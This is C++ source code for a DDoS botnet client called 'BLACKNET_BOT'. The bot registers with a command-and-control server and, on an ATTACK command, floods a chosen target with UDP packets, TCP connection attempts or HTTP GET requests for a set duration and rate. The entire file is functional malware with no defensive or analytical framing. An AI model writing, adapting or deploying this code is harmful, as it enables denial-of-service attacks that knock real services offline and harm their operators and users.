#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define CLOSE_SOCK closesocket
#define SOCKET_ERRNO WSAGetLastError()
#define IS_INVALID(s) (s == INVALID_SOCKET)
#define SLEEP(ms) Sleep(ms)
typedef SOCKET sock_t;
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#define CLOSE_SOCK close
#define SOCKET_ERRNO errno
#define IS_INVALID(s) (s < 0)
#define SLEEP(ms) usleep((ms) * 1000)
#define SOCKET_ERROR -1
typedef int sock_t;
#endif

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <sstream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <mutex>
#include <algorithm>

#ifdef _WIN32
static bool winsock_init() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}
static void winsock_cleanup() { WSACleanup(); }
#else
static bool winsock_init() {
    signal(SIGPIPE, SIG_IGN);
    return true;
}
static void winsock_cleanup() {}
#endif

static std::string get_os() {
#ifdef _WIN32
    return "Windows";
#elif __APPLE__
    return "macOS";
#else
    return "Linux";
#endif
}

static std::string trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    size_t end = s.find_last_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    return s.substr(start, end - start + 1);
}

// ── Attack state ──────────────────────────────────────────────────────────
static std::atomic<bool> attack_running{false};
static std::atomic<long long> packets_sent{0};
static std::atomic<long long> bytes_sent{0};
static std::thread attack_thread;

// ── UDP flood ─────────────────────────────────────────────────────────────
static void udp_flood(const std::string& target, int port, int duration, int rate) {
    sock_t sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (IS_INVALID(sock)) return;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    char buf[1024];
    memset(buf, 'A', sizeof(buf));

    auto start = std::chrono::steady_clock::now();
    long long count = 0;

    while (attack_running) {
        for (int i = 0; i < rate && attack_running; i++) {
            int n = sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
            if (n > 0) {
                count++;
                packets_sent++;
                bytes_sent += n;
            }
        }
        if (duration > 0) {
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration)
                break;
        }
    }
    CLOSE_SOCK(sock);
}

// ── TCP connect flood ─────────────────────────────────────────────────────
static void tcp_flood(const std::string& target, int port, int duration, int rate) {
    auto start = std::chrono::steady_clock::now();
    long long count = 0;

    while (attack_running) {
        for (int i = 0; i < rate && attack_running; i++) {
            sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
            if (!IS_INVALID(sock)) {
                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

#ifdef _WIN32
                u_long mode = 1;
                ioctlsocket(sock, FIONBIO, &mode);
#else
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif
                connect(sock, (struct sockaddr*)&addr, sizeof(addr));
                CLOSE_SOCK(sock);
                count++;
                packets_sent++;
                bytes_sent += 64;
            }
        }
        if (duration > 0) {
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration)
                break;
        }
    }
}

// ── HTTP GET flood ────────────────────────────────────────────────────────
static void http_flood(const std::string& target, int port, int duration, int rate) {
    std::string path = "/";
    std::string host = target;

    std::string req = "GET " + path + " HTTP/1.1\r\n"
                      "Host: " + host + "\r\n"
                      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                      "Connection: keep-alive\r\n\r\n";

    auto start = std::chrono::steady_clock::now();
    long long count = 0;

    while (attack_running) {
        for (int i = 0; i < rate && attack_running; i++) {
            sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
            if (!IS_INVALID(sock)) {
                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

                if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    send(sock, req.data(), req.size(), 0);
                    char buf[1024];
                    recv(sock, buf, sizeof(buf), 0);
                }
                CLOSE_SOCK(sock);
                count++;
                packets_sent++;
                bytes_sent += req.size();
            }
        }
        if (duration > 0) {
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration)
                break;
        }
    }
}

// ── Start attack ──────────────────────────────────────────────────────────
static void start_attack(const std::string& target, int port,
                         const std::string& method, int duration, int rate) {
    if (attack_running) return;
    attack_running = true;
    packets_sent = 0;
    bytes_sent = 0;

    std::string m = method;
    std::transform(m.begin(), m.end(), m.begin(), ::tolower);

    if (m == "udp")
        attack_thread = std::thread(udp_flood, target, port, duration, rate);
    else if (m == "tcp" || m == "tcpconn")
        attack_thread = std::thread(tcp_flood, target, port, duration, rate);
    else if (m == "http" || m == "httpget")
        attack_thread = std::thread(http_flood, target, port, duration, rate);
    else
        attack_running = false;
}

static void stop_attack() {
    attack_running = false;
    if (attack_thread.joinable())
        attack_thread.join();
}

static std::string get_stats() {
    return "STATS PACKETS:" + std::to_string(packets_sent.load()) +
           " BYTES:" + std::to_string(bytes_sent.load()) + "\n";
}

// ── Main bot ──────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " C2_IP:PORT" << std::endl;
        return 1;
    }

    std::string addr_str = argv[1];
    size_t colon = addr_str.find(':');
    if (colon == std::string::npos) {
        std::cerr << "Invalid address. Use IP:PORT" << std::endl;
        return 1;
    }

    std::string server_ip = addr_str.substr(0, colon);
    int server_port = std::stoi(addr_str.substr(colon + 1));

    if (!winsock_init()) {
        std::cerr << "Failed to init sockets" << std::endl;
        return 1;
    }

    std::cout << "[+] Bot starting, connecting to " << server_ip
              << ":" << server_port << " ..." << std::endl;

    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (IS_INVALID(sock)) {
        std::cerr << "Socket failed" << std::endl;
        winsock_cleanup();
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip.c_str(), &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "Connection refused to " << server_ip
                  << ":" << server_port << std::endl;
        CLOSE_SOCK(sock);
        winsock_cleanup();
        return 1;
    }

    // Send handshake
    std::string handshake =
        "BLACKNET_BOT\n"
        "VERSION:2.0\n"
        "OS:" + get_os() + "\n"
        "PORT:0\n\n";

    send(sock, handshake.data(), handshake.size(), 0);
    std::cout << "[+] Connected and registered as bot!" << std::endl;

    // Command loop
    char buf[4096];
    std::string cmd_buf;

    while (true) {
#ifdef _WIN32
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
#else
        ssize_t n = recv(sock, buf, sizeof(buf) - 1, 0);
#endif
        if (n <= 0) break;
        buf[n] = '\0';
        cmd_buf += buf;

        size_t nl;
        while ((nl = cmd_buf.find('\n')) != std::string::npos) {
            std::string cmd = trim(cmd_buf.substr(0, nl));
            cmd_buf.erase(0, nl + 1);
            if (cmd.empty()) continue;

            if (cmd == "PING") {
                send(sock, "PONG\n", 5, 0);
            } else if (cmd == "STATS") {
                std::string s = get_stats();
                send(sock, s.data(), s.size(), 0);
            } else if (cmd.find("ATTACK") == 0) {
                std::istringstream iss(cmd);
                std::string tok;
                std::vector<std::string> parts;
                while (iss >> tok) parts.push_back(tok);

                if (parts.size() >= 4) {
                    std::string atk_target = parts[1];
                    int atk_port = std::stoi(parts[2]);
                    std::string atk_method = parts[3];
                    int atk_duration = parts.size() > 4 ? std::stoi(parts[4]) : 0;
                    int atk_rate = parts.size() > 5 ? std::stoi(parts[5]) : 100;

                    std::cout << "[+] ATTACK from C2: " << atk_method << " "
                              << atk_target << ":" << atk_port
                              << " dur=" << atk_duration << std::endl;

                    start_attack(atk_target, atk_port, atk_method,
                                 atk_duration, atk_rate);
                }
            } else if (cmd == "STOP") {
                std::cout << "[+] STOP from C2" << std::endl;
                stop_attack();
            } else if (cmd.find("BLACKNET_ACK") == 0) {
                // Acknowledgment from C2, ignore
            }
        }
    }

    stop_attack();
    CLOSE_SOCK(sock);
    winsock_cleanup();
    std::cout << "[!] Disconnected from C2" << std::endl;
    return 0;
}
